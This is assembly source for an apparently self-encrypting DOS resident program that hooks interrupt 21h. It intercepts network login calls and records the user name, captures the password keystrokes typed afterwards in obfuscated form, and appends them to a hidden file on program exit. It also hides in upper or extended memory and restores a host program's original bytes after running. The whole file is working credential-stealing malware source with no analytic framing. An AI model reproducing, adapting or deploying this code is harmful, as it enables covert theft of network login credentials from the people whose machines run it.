vector	=	21h

.286
.model tiny
.code

org     0

start:		call	decrypt

flag		db	0
offile		equ	$-start
file		db	80h dup (0)

exec:		mov	si,dx
		dec	si
nextfind:	inc	si
		cmp	[si],ah
		jne	nextfind
		mov	ax,[si-8]
		or	ax,'  '
		sub	ax,'en'
		jnz	checkanother
		mov	al,[si-6]
		or	al,' '
		sub	al,'t'
		jz	okaycomp
checkanother:	mov	ax,[si-7]
		or	ax,'  '
		sub	ax,'lv'
		jnz	quitveryshort
		mov	al,[si-5]
		or	al,' '
		sub	al,'m'
quitveryshort:	jnz	quitshort
okaycomp:	mov	ds,ax
		les	ax,dword ptr cs:save_21h_off
		cli
		mov	ds:[21h*4],ax
		mov	ds:[21h*4+2],es
		pop	es ds
		popa
		popf
		call	old21h
		pushf
		pusha
		push	ds
		push	0
		pop	ds
		lea	ax,int_21h_entry
		cli
		xchg	ax,ds:[21h*4]
		mov	cs:save_21h_off,ax
		mov	ax,cs
		xchg	ax,ds:[21h*4+2]
		mov	cs:save_21h_seg,ax
		jmp	exitretf
		
terminate:	push	cs
		pop	ds
		and	ah,ah
		jnz	quiterm
		test	flag,2
		jz	quiterm
		lea	dx,file
		mov	ax,3d01h
		int	21h
		jc	quit
		xchg	bx,ax
		xor	cx,cx
		xor	dx,dx
		mov	ax,4202h
		int	21h
		lea	dx,objectname
		mov	cx,nextoff1
		sub	cx,dx
		mov	si,dx
		add	si,cx
		inc	cx
		mov	ax,4000h
		mov	[si],al
		int	21h
		mov	ah,3eh
		int	21h
quiterm:	mov	byte ptr ds:objectname,0
		and	flag,not 3
quitshort:	jmp	quit

int_21h_entry:	pushf
		cmp	ax,20aah
		jne	noselfn
		mov	ah,al
		popf
		iret
noselfn:	cld
		pusha
		push	ds es
		xchg	al,ah
		cmp	ax,004bh
		je	execshort
		cmp	ax,17f2h
		je	login
		cmp	al,4ch
		je	terminate
		test	cs:flag,1
		jz	quit
		cmp	al,8
		je	input
quit:		pop	es ds
		popa
		popf
		db	0eah
save_21h_off	dw	?
save_21h_seg	dw	?

execshort:	jmp	exec

login:		push	cs 			;0f217h network function
		pop	es
		cmp	byte ptr [si+2],18h	;login object encrypted?
		jne	quit
		add	si,0dh
		lea	di,objectname
		lodsb
		cbw
		cmp	al,20h
		ja	quit
		cmp	ah,es:[di]
		jne	quit
		xchg	cx,ax
bigletter:	lodsb
		cmp	al,'a'
		jb	nosmall
		cmp	al,'z'
		ja	nosmall
		sub	al,' '
nosmall:	xor	al,0aah
		rol	al,1
		stosb
		loop	bigletter
		mov	al,0edh		;('\' xor 0aah) rol 1
		stosb
		push	cs
		pop	ds
		or	flag,1
		mov	nextoff1,di
		mov	nextoff2,di
		jmp	quit

input:		pop	es ds
		popa
		popf
		call	old21h
		pushf
		pusha
		cld
		push	ds es cs cs
		pop	ds es
		lea	di,password
nextoff1	=	word ptr $-2
		cmp	al,8			;backspace?
		jne	noback
		cmp	di,1234h
nextoff2	=	word ptr $-2
		je	ignore
		dec	di
		mov	byte ptr [di],0
noback:		cmp	al,0dh			;enter?
		jne	noenter
		xor	flag,3
noenter:	cmp	al,' '
		jb	ignore
		cmp	al,7fh
		ja	ignore
		xor	al,0aah
		rol	al,1
		stosb
ignore:		mov	nextoff1,di
		pop	es
exitretf:	pop	ds
		popa
		popf
		retf	2

old21h:		pushf
		cli
		call	dword ptr cs:save_21h_off
		retn

objectname	db	0
tsrdata		label	byte
		db	20h dup (?)
password	db	20h dup (?)

lenprog		equ	$-start

		org	tsrdata

begin:		push	cs
		pop	ds
		call	subzero
subzero:	pop	bp
		sub	bp,offset subzero
		mov	ax,20aah
		int	21h
		cmp	al,ah
		je	exitshort
		lea	dx,offile[bp]
		xor	cx,cx
		mov	ah,5bh
		int	21h
		jc	iscreate
		xchg	bx,ax
		mov	ah,3eh
		int	21h
iscreate:	mov	ax,4300h
		int	2fh
		cmp	al,80h
		jne	no_xms_drv
		push	es
		mov	ax,4310h
		int	2fh
		lea	di,xms_entry
		mov	[bp+di],bx
		mov	[bp+di+2],es
		mov	dx,(lenprog+0fh)/10h
		mov	ah,10h
		call	dword ptr [bp+di]
		pop	es
		mov	dx,bx
		dec	ax
		jz	okalloc
no_xms_drv:	mov	ax,5800h
		int	21h
		push	ax
		mov	ah,30h
		int	21h
		xor	bx,bx
		cmp	al,4
		jbe	nouseumb
		mov	bl,80h
nouseumb:	mov	ax,5801h
		push	ax
		int	21h
		mov	ax,5802h
		int	21h
		cbw
		push	ax
		mov	bl,1
		mov	ax,5803h
		push	ax
		int	21h
		call	getmem
		sbb	cx,cx
		pop	ax bx
		int	21h
		pop	ax bx
		int	21h
okalloc:	xor	di,di
		jcxz	allocated
		mov	dx,es
		dec	dx
		mov	ds,dx
		mov	bx,[di+3]
		sub	bx,(lenprog+0fh)/10h+1
exitshort:	jbe	exit
		mov	ah,4ah
		int	21h
		jc	exit
		call	getmem
		jc	exit
allocated:	mov	es,dx
		dec	dx
		mov	ds,dx
		inc	dx
		mov	word ptr [di+1],70h
		mov	si,bp
		mov	cx,lenprog
		rep	movs byte ptr es:[di],cs:[si]
		mov	ds,cx
		cli
		lea	ax,int_21h_entry
		xchg	ax,ds:[21h*4]
		mov	es:save_21h_off,ax
		xchg	dx,ds:[21h*4+2]
		mov	es:save_21h_seg,dx
		sti
exit:		mov	ah,51h
		int	21h
		lea	si,firstbytes[bp]
		mov	ax,cs:[si]
		mov	ds,bx
		mov	es,bx
		not	ax
		mul	ah
		cmp	ax,72bah
		mov	ax,0
		je	itexe
		mov	di,100h
		push	di
		movsb
		movsw
		retn
itexe:		add	bx,10h
		add	cs:[si+16h],bx
		add	cs:[si+0eh],bx
		cli
		mov	ss,cs:[si+0eh]
		mov	sp,cs:[si+10h]
		sti
		jmp	dword ptr cs:[si+14h]

getmem:		mov	bx,(lenprog+0fh)/10h
		mov	ah,48h
		int	21h
		xchg	dx,ax
		retn

lendecrypt	equ	$-start-3

decrypt:	cld
		mov	ah,34h
		int	21h
		mov	di,es:[bx+0Fh]
		mov	ah,51h
		int	21h
		mov	es,di
		mov	bp,sp
		mov	ds,bx
		sub	di,bx
		mov	ax,[di+16h]
		mov	ds,ax
		sub	ax,[di+16h]
		xchg	si,ax
		lodsw
		mov	bx,[bp+di]
		lea	si,begin[bx+si-5]
		xchg	si,[bp+di]
		mov	cx,lendecrypt
wordxor:	sub	ax,0
secondmask	=	word ptr $-2
		xor	cs:[si],al
		ror	ax,1
		inc	si
		loop	wordxor
		retn

firstbytes	db	18h dup (?)
xms_entry	dd	?

		end	start
